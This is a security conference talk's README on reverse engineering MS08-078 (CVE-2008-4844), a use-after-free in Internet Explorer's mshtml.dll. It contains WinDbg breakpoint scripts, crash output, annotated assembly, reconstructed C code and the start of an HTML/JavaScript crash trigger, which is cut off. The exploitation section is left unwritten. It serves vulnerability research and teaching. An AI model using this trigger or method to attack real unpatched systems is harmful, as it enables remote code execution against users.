```
/**************************************************************************
 * Talk:        Inception - The extended edition
 * Author:      Nelson Brito <nbrito *NoSPAM* sekure.org>
 * Conference:  Hackers to Hackers Conference Eighth Edition (October 2011)
 **************************************************************************
 *         .___                            __  .__                        *
 *         |   | ____   ____  ____ _______/  |_|__| ____   ____           *
 *         |   |/    \_/ ___\/ __ \\____ \   __\  |/  _ \ /    \          *
 *         |   |   |  \  \__\  ___/|  |_> >  | |  (  <_> )   |  \         *
 *         |___|___|__/\_____>_____>   __/|__| |__|\____/|___|__/         *
 *                                 |__|                                   *
 *                     _______________  ____ ____                         *
 *                     \_____  \   _  \/_   /_   |                        *
 *                      /  ____/  /_\  \|   ||   |                        *
 *                     /       \  \_/   \   ||   |                        *
 *                     \________\_______/___||___|                        *
 *                                                                        *
 **************************************************************************/
```
# Origins: Inception
## Inception: Tips and tricks I've learned reversing vulnerabilities!
_"Sometimes, the best way to advance is in reverse"_. ([Reversing: Secrest of Reverse Engineering](https://en.wikipedia.org/wiki/Reversing:_Secrets_of_Reverse_Engineering))

Every time any new vulnerability comes out we should be ready to understand it, in order to perform its exploitation or even to build defenses. [Reverse engineering](https://en.wikipedia.org/wiki/Reverse_engineering) is one of the most powerful approaches.

Many talks have been done in the last years, as well as too many useless information has been given by security community. This [talk](https://github.com/nbrito/talks/blob/master/2016/ibm-systems/nbrito-inception.pdf) shares some tips and trick learned during real vulnerability [reverse engineering](https://en.wikipedia.org/wiki/Reverse_engineering) process, such as:
* Gathering information about the vulnerability.
* Understand the weakness type.
* Preparing the vulnerable ecosystem.
* Building a toolbox to be used.
* [Reverse engineering](https://en.wikipedia.org/wiki/Reverse_engineering) the vulnerability.
* Etc...

It shows, using very detailed [demonstration](https://vimeo.com/nbrito), how to achieve the "_**state-of-art**_" building exploitation and defenses, using your own exploitation skills.

The "_**black magic**_" is finally unveiled, showing how to use tools (public available) to understand and apply [reverse engineering](https://en.wikipedia.org/wiki/Reverse_engineering) to a vulnerability.

## Conferences
1. [Hackers to Hackers Conference](https://www.h2hc.com.br/) Eighth Edition (October 29 to 30, 2011):
* ["Inception: Tips and tricks I've learned reversing vulnerabilities!"](https://github.com/nbrito/talks/tree/master/2011/h2hc)
2. [Garoa Hacker Clube](http://garoa.net.br/wiki/Página_principal) Turing Clube Especial (December 14, 2011):
* ["Inception: Tips and tricks I've learned reversing vulnerabilities!"](https://github.com/nbrito/talks/tree/master/2011/h2hc)
3. [Conferência O Outro Lado Edição 3 / Security BSides São Paulo](https://www.garoa.net.br/wiki/O_Outro_Lado_BSidesSP_ed_3) (May 6, 2012):
* ["Reverse Engineering: Everything you wanted to know about reverse engineering, but were too embarrassed to ask!"](https://github.com/nbrito/talks/tree/master/2011/h2hc)
4.  [VII Workshop de Segurança da Informação / SegInfo](http://www.evento.seginfo.com.br/) (August 31, 2012 to September 1, 2012):
* ["Reverse Engineering Client-side Bugs in the APT Age"](https://github.com/nbrito/talks/tree/master/2011/h2hc)
5. [BHack Conference 2013](http://www.bhack.com.br/) (June 22/23, 2013):
* ["REVERSING: A client-side vulnerability under the microscope!"](https://github.com/nbrito/talks/tree/master/2013/bhack)
6. [The Developer's Conference 2015](http://www.thedevelopersconference.com.br/tdc/2015/saopaulo/trilha-seguranca) (July 24, 2015):
* ["Engenharia Reversa: Um Estudo de Caso"](https://github.com/nbrito/talks/tree/master/2013/bhack)
7. [Quinta Academia SSI @ ITAÚ](https://www.itau.com.br/) (April 26, 2016):
* ["Inception: The extended edition"](https://github.com/nbrito/talks/tree/master/2013/bhack)
8. [ROADSEC-RJ](http://roadsec.com.br/riodejaneiro2016/) (October 1, 2016):
* ["Inception: The extended edition"](https://github.com/nbrito/talks/tree/master/2013/bhack)
9. [IBM Systems Technical University](https://www-03.ibm.com/services/learning/ites.wss/zz-en?pageType=page&c=X515387T93550G53) (October 18 to 20, 2016):
* ["Inception: A reverse-engineer horror history"](https://github.com/nbrito/talks/tree/master/2016/ibm-systems)

# Motivation
Many talks have been done in the last years, as well as too many useless information has been given by security community:
* Mostly related to purpose-built frameworks, tools and libraries.
* Some others addressing how to translate to a readable format.
* None addressing real world vulnerabilities.

Almost all ot these talks leave both [apprentices](https://en.wikipedia.org/wiki/Newbie) and [security professionals](https://en.wikipedia.org/wiki/List_of_computer_security_certifications) in a [black hole](https://en.wikipedia.org/wiki/Black_hole), with tons of misinformation. [IMHO](https://en.wiktionary.org/wiki/IMHO), this is deception.

The [apprentices](https://en.wikipedia.org/wiki/Newbie) demand much more than simple [```hello world```](https://en.wiktionary.org/wiki/Hello_World) bugs, because, once you have [created the bug](http://phrack.org/issues/49/14.html), you can exploit it easily. Take the following example:
```
; accept(SOCKET, struct sockaddr FAR*, int FAR*)
push	ebx		; ebx = int FAR*
push	esp		; esp = struct sockaddr FAR*
push	edi		; edi = SOCKET
call	_accept		; accept(edi, esp, ebx)
mov	edi, eax	; moving eax to edi
			; eax = return()
			; edi = SOCKET accept()
```
No matter what someone tries to convincing you, this is not [reverse engineer](https://en.wikipedia.org/wiki/Reverse_engineering)... This is just a "_**translation**_".

# Inception
Every time a new vulnerability comes out, we should be ready to understand it, in order to perform: exploitation, detection, prevention and mitigation. Sometimes, none or just a few information regarding a new vulnerability  is publicly available... And sometimes, these information regarding a new vulnerability are wrong or, to be polite, uncompleted.

[Reverse engineer](https://en.wikipedia.org/wiki/Reverse_engineering) is one of the most powerful approaches available to deeply understand a new vulnerability, and, sometimes, to "_**rediscover**_" the new vulnerability.
* Rediscover the new vulnerability means that you did not actually discover a new vulnerability, but you can, and are able to, figure out valuable information about it.

Some vulnerabilities do not have proof-of-concept codes released, consequentially, no valuable information, due to:
* Widely used software.
* Critical infra-structure.
* Patch/Fix is unavailable (0-day).
* [Non-disclosure agreement (NDA)](https://en.wiktionary.org/wiki/non-disclosure_agreement).
* Vulnerability is for sale (good sense and/or bad sense).

Information is a keyword to move forward in a reverse engineer, and a couple of good information are as good as all the information you need... Remember:
* Drops can fill an ocean.

[Apprentices](https://en.wikipedia.org/wiki/Newbie) must know how to perform [reverse engineer](https://en.wikipedia.org/wiki/Reverse_engineering), instead of how to use a purpose-built framework, tool or library. To address this demand, the [Inception](https://github.com/nbrito/talks/blob/master/2016/ibm-systems/nbrito-inception.pdf) defines four **dream levels** to perform [reverse engineer](https://en.wikipedia.org/wiki/Reverse_engineering):
1. [**DREAM LEVEL 1**](https://github.com/nbrito/research/tree/master/inception#dream-level-1): prepare the vulnerable ecosystem.
2. [**DREAM LEVEL 2**](https://github.com/nbrito/research/tree/master/inception#dream-level-2): gather valuable information of vulnerability.
3. [**DREAM LEVEL 3**](https://github.com/nbrito/research/tree/master/inception#dream-level-3): analyze the vulnerability.
4. [**KICK or LIMBO**](https://github.com/nbrito/research/tree/master/inception#kick-or-limbo): exploiting the vulnerability.

# DREAM LEVEL 1
## Checklist
Before starting the [reverse engineer](https://en.wikipedia.org/wiki/Reverse_engineering), the following questions must be answered:
1. Has a vulnerability been chosen?
* There is nothing to do without a vulnerability.
2. Are there valuable information about the vulnerability?
* Gather valuable information to understand the weakness type regarding the vulnerability, as well as any feature and/or technology surrounding to trigger the vulnerability.
3. Is the vulnerable ecosystem affordable?
* Avoid exotic vulnerable ecosystem, because it must be configured as a test-bed and its deep knowledge are “```sine qua non```”.
4. Are there public tools available to perform a reverse engineer?
* A good set of public tools will define the success of the [reverse engineer](https://en.wikipedia.org/wiki/Reverse_engineering).
* Development skills are always necessary, otherwise the [reverse engineer](https://en.wikipedia.org/wiki/Reverse_engineering) will fail.
5. Which analysis method should be applied?
* Choose and understand the analysis method that will be applied.

## Inception Example
For our example, the following answers have been found:
1. Has a vulnerability been chosen?
* [MS08-078](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2008/ms08-078) ([CVE-2008-4844](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4844)).
2. Are there valuable information about the vulnerability?
* Keywords: "XML Island”, “Data Binding”, “use-after-free”, “```MSHTML.dll```”, “XML document”, “```<SPAN>```”, “nested”.
3. Is the vulnerable ecosystem affordable?
* Microsoft Internet Explorer 7 and Microsoft Windows XP SP3.
4. Are there public tools available to perform a reverse engineer?
* [Debugging Tools for Windows](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/), [Windows Symbol Package for Windows XP SP3](https://developer.microsoft.com/en-us/windows/hardware/download-symbols) and [IDA Pro 5.0 Freeware Version](https://www.hex-rays.com/products/ida/support/download_freeware.shtml).
5. Which analysis method should be applied?
* White Box, Black Box and Grey/Gray Box.

# DREAM LEVEL 2
Stay tuned for the upcoming description.

# DREAM LEVEL 3
Stay tuned for the upcoming description.

## Mapping
### Black Boxing
```
0:018> bc *
0:018> bp 7ea8226f ".printf \"********************************************************************************\\n\"; g"
0:018> bp 7ea8227a ".printf \"[TransferToDestination] Setting \'Array Object\': \'Array Elements\' @ EDI -> %08x[%d] = { \", edi, (poi(edi+08) >> 2); .for (r $t0 = 0 ; @$t0 <= (poi(edi+08) >> 2) - 1 ; r $t0 = @$t0 + 1) { .printf \" %08x, \", poi(poi(edi+0C)+(@$t0*4)); }; .printf \"}.\\n\"; g"
0:018> bp 7ea8227d ".printf \"[TransferToDestination] Setting \'Array.Size()\': %d (@ %08x).\\n\", esi, edi+8; g"
0:018> bp 7ea8227f ".printf \"[TransferToDestination] Setting \'Counter\': %d.\\n\", ebx; g"
0:018> bp 7ea82282 ".printf \"[TransferToDestination] Setting \'Array.Size()\': %d @ ESI.\\n\", esi; g"
0:018> bp 7ea82283 ".printf \"[TransferToDestination] Setting \'Array Index\': %d @ ESI.\\n\", esi; g"
0:018> bp 7ea82288 ".printf \"[TransferToDestination]\"; .if (ebx == 0) { .printf \" Starting \"; } .else { .printf \" Restarting \"; }; .printf \"\'Loop\': \'Counter\' is %d and \'Array Index\' is %d (@ ESI).\\n\", ebx, esi; g"
0:018> bp 7ea8228b ".printf \"[TransferToDestination] Setting \'Array[%d]\': \'Array Element\' @ %08x.\\n\", ebx, poi(eax+ebx*4); g"
0:018> bp 7ea8228f ".printf \"[TransferToDestination] Checking \'Array[%d]\': is \'Array Element\' @ %08x NULL?\\n\", ebx, poi(eax+ebx*4); g"
0:018> bp 7ea82294 ".printf \"[TransferToDestination] Calling \'Array[%d]\'->TransferFromSrc: \'Array Element\' @ %08x.\\n\", ebx, poi(eax+ebx*4); g"
0:018> bp 7ea822a7 ".printf \"[TransferToDestination] Incrementing \'Counter\': %d.\\n[TransferToDestination] Comparing \'Counter\' and \'Array Index\': \'Counter\' is %d and \'Array Index\' is %d (@ ESI).\\n\", ebx, ebx, esi; .if ((esi > (poi(edi+08) >> 2) - 1) & (ebx <= esi)) { .printf \"[TransferToDestination] Warning \'Array Index\': should be %d (@ %08x) instead of %d (@ESI).\\n\", (poi(edi+8) >> 2) - 1, edi+8, esi; g; } .else { g; }"
0:018> bp 7ea822b2 ".printf \"********************************************************************************\\n\"; g"
0:018> g
ModLoad: 76200000 76277000   C:\WINDOWS\system32\mshtmled.dll
ModLoad: 72d20000 72d29000   C:\WINDOWS\system32\wdmaud.drv
ModLoad: 72d20000 72d29000   C:\WINDOWS\system32\wdmaud.drv
ModLoad: 72d10000 72d18000   C:\WINDOWS\system32\msacm32.drv
ModLoad: 77be0000 77bf5000   C:\WINDOWS\system32\MSACM32.dll
ModLoad: 77bd0000 77bd7000   C:\WINDOWS\system32\midimap.dll
ModLoad: 68000000 68036000   C:\WINDOWS\system32\rsaenh.dll
ModLoad: 6cc60000 6cc68000   C:\WINDOWS\System32\dispex.dll
(de8.49c): Unknown exception - code 80040155 (first chance)
(de8.fe0): Unknown exception - code 80040155 (first chance)
ModLoad: 74980000 74a93000   C:\WINDOWS\System32\msxml3.dll
ModLoad: 73160000 731d7000   C:\Program Files\Common Files\System\Ole DB\oledb32.dll
ModLoad: 765b0000 765d5000   C:\WINDOWS\system32\MSDART.DLL
ModLoad: 763b0000 763f9000   C:\WINDOWS\system32\comdlg32.dll
ModLoad: 75350000 75361000   C:\Program Files\Common Files\System\Ole DB\OLEDB32R.DLL
********************************************************************************
[TransferToDestination] Setting 'Array Object': 'Array Elements' @ EDI -> 064785e0[2] = {  064788d8,  06478938, }.
[TransferToDestination] Setting 'Array.Size()': 8 (@ 064785e8).
[TransferToDestination] Setting 'Counter': 0.
[TransferToDestination] Setting 'Array.Size()': 2 @ ESI.
[TransferToDestination] Setting 'Array Index': 1 @ ESI.
[TransferToDestination] Starting 'Loop': 'Counter' is 0 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[0]': 'Array Element' @ 064788d8.
[TransferToDestination] Checking 'Array[0]': is 'Array Element' @ 064788d8 NULL?
[TransferToDestination] Calling 'Array[0]'->TransferFromSrc: 'Array Element' @ 064788d8.
ModLoad: 06b70000 06b79000   C:\WINDOWS\system32\idndl.dll
[TransferToDestination] Incrementing 'Counter': 1.
[TransferToDestination] Comparing 'Counter' and 'Array Index': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Warning 'Array Index': should be 0 (@ 064785e8) instead of 1 (@ESI).
[TransferToDestination] Restarting 'Loop': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[1]': 'Array Element' @ 06478938.
[TransferToDestination] Checking 'Array[1]': is 'Array Element' @ 06478938 NULL?
[TransferToDestination] Calling 'Array[1]'->TransferFromSrc: 'Array Element' @ 06478938.
[TransferToDestination] Incrementing 'Counter': 2.
[TransferToDestination] Comparing 'Counter' and 'Array Index': 'Counter' is 2 and 'Array Index' is 1 (@ ESI).
********************************************************************************
********************************************************************************
[TransferToDestination] Setting 'Array Object': 'Array Elements' @ EDI -> 064785e0[0] = { }.
[TransferToDestination] Setting 'Array.Size()': 0 (@ 064785e8).
[TransferToDestination] Setting 'Counter': 0.
[TransferToDestination] Setting 'Array.Size()': 0 @ ESI.
[TransferToDestination] Setting 'Array Index': -1 @ ESI.
********************************************************************************
********************************************************************************
[TransferToDestination] Setting 'Array Object': 'Array Elements' @ EDI -> 064d4c20[2] = {  06478848,  064788a8, }.
[TransferToDestination] Setting 'Array.Size()': 8 (@ 064d4c28).
[TransferToDestination] Setting 'Counter': 0.
[TransferToDestination] Setting 'Array.Size()': 2 @ ESI.
[TransferToDestination] Setting 'Array Index': 1 @ ESI.
[TransferToDestination] Starting 'Loop': 'Counter' is 0 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[0]': 'Array Element' @ 06478848.
[TransferToDestination] Checking 'Array[0]': is 'Array Element' @ 06478848 NULL?
[TransferToDestination] Calling 'Array[0]'->TransferFromSrc: 'Array Element' @ 06478848.
[TransferToDestination] Incrementing 'Counter': 1.
[TransferToDestination] Comparing 'Counter' and 'Array Index': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Warning 'Array Index': should be 0 (@ 064d4c28) instead of 1 (@ESI).
[TransferToDestination] Restarting 'Loop': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[1]': 'Array Element' @ 064788a8.
[TransferToDestination] Checking 'Array[1]': is 'Array Element' @ 064788a8 NULL?
[TransferToDestination] Calling 'Array[1]'->TransferFromSrc: 'Array Element' @ 064788a8.
[TransferToDestination] Incrementing 'Counter': 2.
[TransferToDestination] Comparing 'Counter' and 'Array Index': 'Counter' is 2 and 'Array Index' is 1 (@ ESI).
********************************************************************************
********************************************************************************
[TransferToDestination] Setting 'Array Object': 'Array Elements' @ EDI -> 064d4c20[0] = { }.
[TransferToDestination] Setting 'Array.Size()': 0 (@ 064d4c28).
[TransferToDestination] Setting 'Counter': 0.
[TransferToDestination] Setting 'Array.Size()': 0 @ ESI.
[TransferToDestination] Setting 'Array Index': -1 @ ESI.
********************************************************************************
********************************************************************************
[TransferToDestination] Setting 'Array Object': 'Array Elements' @ EDI -> 06478678[2] = {  064dc890,  064dc8f0, }.
[TransferToDestination] Setting 'Array.Size()': 8 (@ 06478680).
[TransferToDestination] Setting 'Counter': 0.
[TransferToDestination] Setting 'Array.Size()': 2 @ ESI.
[TransferToDestination] Setting 'Array Index': 1 @ ESI.
[TransferToDestination] Starting 'Loop': 'Counter' is 0 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[0]': 'Array Element' @ 064dc890.
[TransferToDestination] Checking 'Array[0]': is 'Array Element' @ 064dc890 NULL?
[TransferToDestination] Calling 'Array[0]'->TransferFromSrc: 'Array Element' @ 064dc890.
[TransferToDestination] Incrementing 'Counter': 1.
[TransferToDestination] Comparing 'Counter' and 'Array Index': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Warning 'Array Index': should be 0 (@ 06478680) instead of 1 (@ESI).
[TransferToDestination] Restarting 'Loop': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[1]': 'Array Element' @ 064dc8f0.
[TransferToDestination] Checking 'Array[1]': is 'Array Element' @ 064dc8f0 NULL?
[TransferToDestination] Calling 'Array[1]'->TransferFromSrc: 'Array Element' @ 064dc8f0.
[TransferToDestination] Incrementing 'Counter': 2.
[TransferToDestination] Comparing 'Counter' and 'Array Index': 'Counter' is 2 and 'Array Index' is 1 (@ ESI).
********************************************************************************
********************************************************************************
[TransferToDestination] Setting 'Array Object': 'Array Elements' @ EDI -> 06478678[0] = { }.
[TransferToDestination] Setting 'Array.Size()': 0 (@ 06478680).
[TransferToDestination] Setting 'Counter': 0.
[TransferToDestination] Setting 'Array.Size()': 0 @ ESI.
[TransferToDestination] Setting 'Array Index': -1 @ ESI.
********************************************************************************
********************************************************************************
[TransferToDestination] Setting 'Array Object': 'Array Elements' @ EDI -> 06483be0[2] = {  0648b4d0,  064d4c28, }.
[TransferToDestination] Setting 'Array.Size()': 8 (@ 06483be8).
[TransferToDestination] Setting 'Counter': 0.
[TransferToDestination] Setting 'Array.Size()': 2 @ ESI.
[TransferToDestination] Setting 'Array Index': 1 @ ESI.
[TransferToDestination] Starting 'Loop': 'Counter' is 0 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[0]': 'Array Element' @ 0648b4d0.
[TransferToDestination] Checking 'Array[0]': is 'Array Element' @ 0648b4d0 NULL?
[TransferToDestination] Calling 'Array[0]'->TransferFromSrc: 'Array Element' @ 0648b4d0.
[TransferToDestination] Incrementing 'Counter': 1.
[TransferToDestination] Comparing 'Counter' and 'Array Index': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Warning 'Array Index': should be 0 (@ 06483be8) instead of 1 (@ESI).
[TransferToDestination] Restarting 'Loop': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[1]': 'Array Element' @ 064d4c28.
[TransferToDestination] Checking 'Array[1]': is 'Array Element' @ 064d4c28 NULL?
[TransferToDestination] Calling 'Array[1]'->TransferFromSrc: 'Array Element' @ 064d4c28.
[TransferToDestination] Incrementing 'Counter': 2.
[TransferToDestination] Comparing 'Counter' and 'Array Index': 'Counter' is 2 and 'Array Index' is 1 (@ ESI).
********************************************************************************
********************************************************************************
[TransferToDestination] Setting 'Array Object': 'Array Elements' @ EDI -> 06483be0[0] = { }.
[TransferToDestination] Setting 'Array.Size()': 0 (@ 06483be8).
[TransferToDestination] Setting 'Counter': 0.
[TransferToDestination] Setting 'Array.Size()': 0 @ ESI.
[TransferToDestination] Setting 'Array Index': -1 @ ESI.
********************************************************************************
********************************************************************************
[TransferToDestination] Setting 'Array Object': 'Array Elements' @ EDI -> 064e04f8[2] = {  064e1650,  064e16b0, }.
[TransferToDestination] Setting 'Array.Size()': 8 (@ 064e0500).
[TransferToDestination] Setting 'Counter': 0.
[TransferToDestination] Setting 'Array.Size()': 2 @ ESI.
[TransferToDestination] Setting 'Array Index': 1 @ ESI.
[TransferToDestination] Starting 'Loop': 'Counter' is 0 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[0]': 'Array Element' @ 064e1650.
[TransferToDestination] Checking 'Array[0]': is 'Array Element' @ 064e1650 NULL?
[TransferToDestination] Calling 'Array[0]'->TransferFromSrc: 'Array Element' @ 064e1650.
[TransferToDestination] Incrementing 'Counter': 1.
[TransferToDestination] Comparing 'Counter' and 'Array Index': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Warning 'Array Index': should be 0 (@ 064e0500) instead of 1 (@ESI).
[TransferToDestination] Restarting 'Loop': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[1]': 'Array Element' @ 064e16b0.
[TransferToDestination] Checking 'Array[1]': is 'Array Element' @ 064e16b0 NULL?
[TransferToDestination] Calling 'Array[1]'->TransferFromSrc: 'Array Element' @ 064e16b0.
[TransferToDestination] Incrementing 'Counter': 2.
[TransferToDestination] Comparing 'Counter' and 'Array Index': 'Counter' is 2 and 'Array Index' is 1 (@ ESI).
********************************************************************************
********************************************************************************
[TransferToDestination] Setting 'Array Object': 'Array Elements' @ EDI -> 064e04f8[0] = { }.
[TransferToDestination] Setting 'Array.Size()': 0 (@ 064e0500).
[TransferToDestination] Setting 'Counter': 0.
[TransferToDestination] Setting 'Array.Size()': 0 @ ESI.
[TransferToDestination] Setting 'Array Index': -1 @ ESI.
********************************************************************************
********************************************************************************
[TransferToDestination] Setting 'Array Object': 'Array Elements' @ EDI -> 064d5aa8[2] = {  064d30e0,  064d3140, }.
[TransferToDestination] Setting 'Array.Size()': 8 (@ 064d5ab0).
[TransferToDestination] Setting 'Counter': 0.
[TransferToDestination] Setting 'Array.Size()': 2 @ ESI.
[TransferToDestination] Setting 'Array Index': 1 @ ESI.
[TransferToDestination] Starting 'Loop': 'Counter' is 0 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[0]': 'Array Element' @ 064d30e0.
[TransferToDestination] Checking 'Array[0]': is 'Array Element' @ 064d30e0 NULL?
[TransferToDestination] Calling 'Array[0]'->TransferFromSrc: 'Array Element' @ 064d30e0.
[TransferToDestination] Incrementing 'Counter': 1.
[TransferToDestination] Comparing 'Counter' and 'Array Index': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Warning 'Array Index': should be 0 (@ 064d5ab0) instead of 1 (@ESI).
[TransferToDestination] Restarting 'Loop': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[1]': 'Array Element' @ 064d3140.
[TransferToDestination] Checking 'Array[1]': is 'Array Element' @ 064d3140 NULL?
[TransferToDestination] Calling 'Array[1]'->TransferFromSrc: 'Array Element' @ 064d3140.
(de8.fe0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=06d8fca8 ebx=000c0000 ecx=000c0000 edx=7e90876d esi=064d3140 edi=00000000
eip=7ea814a1 esp=06d8fc8c ebp=06d8fc8c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
mshtml!CXferThunk::PvInitVar+0x5:
7ea814a1 ff7118          push    dword ptr [ecx+18h]  ds:0023:000c0018=????????
0:018>
```
For further information, please, refer to this [link](https://github.com/nbrito/research/tree/master/inception/reversing).

## Understanding
### White Boxing
1. Assembly Code (Commented)
```
TransferToDestination@CRecordInstance PROC NEAR USES EAX ECX EBX EDI ESI EBP ESP
start:
mov		edi, edi			;; make sure 'edi' will be saved
push	ebp					;; save the value of 'ebp'
mov		ebp, esp			;; 'ebp' points to the top of the stack
push	ecx					;; save the value of 'ecx'
push	ebx					;; save the value of 'ebx'
push	esi					;; save the value of 'esi'
push	edi					;; save the value of 'edi'
mov		edi, ecx			;; 'ecx' is 'Array' pointer
						;;  - pointer is moved to 'edi'
mov		esi, [edi+08h]			;; '[edi+08h]' is the 'Array' size
						;;  - size is moved to 'esi'
xor		ebx, ebx			;; 'ebx' is the 'Counter' for 'do_while' 'Loop'
						;;  - xoring 'ebx' the value will be 0
shr		esi, 02h			;; 'esi' is shifted right 2 bits
						;;  - a good explanation is:
						;;   - 16      = 0Ch = 0000 0000 0001 0000 = 16
						;;   - 16 >> 2 = 04h = 0000 0000 0000 0100 = 4
						;;  - this operation is very similar to:
						;;   - int _arX[x] = { 1, 2, 3, 4, ..., x };
						;;   - int _szX = sizeof(_arX)/sizeof(*_arX);
						;;   - or 'Array.Size()'
						;;   - or 'std::array::size' method
dec		esi				;; IF 'esi' decremented < 0
						;;  - this operation is very similar to:
						;;   - int _arX[x] = { 1, 2, 3, 4, ..., x };
						;;   - int _szX = (sizeof(_arX)/sizeof(*_arX));
                                    		;;   - _szX -= 1;
						;;   - or 'Array.Size() - 1'
						;;  - 'esi' is the 'Array Index'
mov		dword ptr [ebp-04h], ebx	;; 'ebx' as the '[ebp-04h]'
js		return				;; THEN 'return'
						;; ELSE
do_while:					;; 'do_while'
									;;  - there is more to do
mov		eax, [edi+0Ch]			;; '[edi+0Ch]' is the 'Array Elements' pointer
						;;  - pointer is moved to 'eax'
cmp		dword ptr [eax+ebx*04h], 0	;; IF 'Array Element' == 0
						;;  - a good explanation is:
						;;	 - each 'Loop' increments 'Counter'
						;;    - #1: 'ebx' is 0 and 'eax' is 12345678h
						;;     - 'Array Element' is (12345678h+(0*4))
						;;     - or 1234567Ch
						;;    - #2: 'ebx' is 1 and 'eax' is 12345678h
						;;     - 'Array Element' is (12345678h+(1*4))
						;;     - or 12345680h
je		continue			;; THEN 'continue'
						;; ELSE
mov		ecx, [eax+ebx*04h]		;; '[eax+ebx*04h]' is the 'Array Element' pointer
						;;  - pointer is moved to 'ecx'
call	TransferFromSrc@CXfer			;; call 'CXfer::TransferFromSrc()'
test	eax, eax				;; IF 'eax' == 0
						;;  - 'eax' modified by 'CXfer::TransferFromSrc()'
je		continue			;; THEN 'continue'
						;; ELSE
cmp		dword ptr [ebp-04h], 0		;; IF '[ebp-04h]' != 0
						;;  - '[ebp-04h]' already has 0
						;;  - 'mov dword ptr [ebp-04h], ebx'
						;;  - a good explanation is:
						;;	 - each 'Loop' increments 'Counter'
						;;    - #1: '[ebp-04h]' is 0
						;;     - THEN 'continue'
						;;    - #2: '[ebp-04h]' is 1
						;;     - ELSE 'mov dword ptr [ebp-04h], eax'
						;;   - 0 seens to be OK and anything else NOT OK
jne		continue			;; THEN 'continue'
						;; ELSE
mov		dword ptr [ebp-04h], eax	;; 'eax' as the '[ebp-04h]'
continue:					;; 'continue'
						;;  - whether there is nothing or more to do
inc		ebx				;; increment the 'Counter'
cmp		ebx, esi			;; IF 'Counter' <= 'Array Index'
						;;  - a good explanation for MS08-078 is:
						;;   - since the 'Array' has been freed
						;;   - the 'Array Elements' have been destroyed
						;;   - the '[edi+08h]' has been updated
						;;   - but 'Array Index' (esi) hasn't been
jle		do_while			;; THEN 'do_while'
						;; ELSE
return:						;; 'return'
						;;  - there is nothing to do
mov		eax, dword ptr [ebp-04h]	;; 'eax' points to the '[ebp-04h]'
pop		edi				;; 'edi' is 'Array' pointer
pop		esi				;; 'esi' is 'Array Index'
pop		ebx				;; 'ebx' is 'Counter' or 'Array Elements'
leave						;; destroy current stack frame
						;;  - restore the previous frame
ret						;; guess what? ;)
stop:
TransferToDestination@CRecordInstance ENDP
```
### C Code (Reverse Engineered)
```
int CRecordInstance::TransferToDestination () {
	int ebp_minus_4h, eax;
	int esi, ebx = 0;

	esi = (sizeof(edi) >> 2) - 1;

	ebp_minus_4h = ebx;

	do{
		if(edi[ebx] == 0) continue;

		eax = edi[ebx]->TransferFromSrc();

		if((ebp_minus_4h == 0) && (eax != 0))
			ebp_minus_4h = eax;

		ebx++;
	}while(ebx <= esi);

	return(ebp_minus_4h);
}
````

# KICK or LIMBO
Stay tuned for the upcoming description.

# BONUS
## [CVE-2008-4844](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4844) Description
After three years, the [CVE Board](http://cve.mitre.org/community/board/index.html) has decided to change the description for [CVE-2008-4844](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4844) based on this research. As a direct result, the [CVE-2008-4844](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4844) is much more accurate than before. Check by yourself...
### Previous
_Use-after-free vulnerability in ```mshtml.dll``` in Microsoft Internet Explorer 5.01, 6, and 7 on Windows XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold and SP1, and Server 2008 allows remote attackers to execute arbitrary code via a crafted XML document containing nested ```SPAN``` elements, as exploited in the wild in December 2008._
### Current
_Use-after-free vulnerability in the ```CRecordInstance::TransferToDestination``` function in ```mshtml.dll``` in Microsoft Internet Explorer 5.01, 6, 6 SP1, and 7 allows remote attackers to execute arbitrary code via DSO bindings involving (1) an XML Island, (2) XML DSOs, or (3) Tabular Data Control (TDC) in a crafted HTML or XML document, as demonstrated by nested ```SPAN``` or ```MARQUEE``` elements, and exploited in the wild in December 2008._
### Suggested
_Internet Explorer 5.01, 6, 7, 8 Beta-1 and Beta-2 use-after-free condition within ```MSHTML.DLL```, due to ```CRecordInstance::TransferToDestination()``` while checking for ```CXfer``` array size, allows remote code execution via crafted HTML document using (**multiple**) nested HTML Bindable Elements referring to predefined Data Source Object (XML Island, XML DSOs or Tabular Data Control)._

By "_using (**multiple**) nested HTML Bindable Elements_" I meant that the ```DIV```, ```LABEL```, ```FIELDSET+LEGEND```, ```MARQUEE``` and ```SPAN``` HTML Elements can also be used to reproduce the vulnerability, and they do not even need to be the same, they can be mixed, for example:
```
<HTML>
<SCRIPT LANGUAGE="JavaScript">
function Inception (){
	document.getElementById("b00m").innerHTML =
		"<XML ID=I>" +
		"<X>" +
		"<C>" +
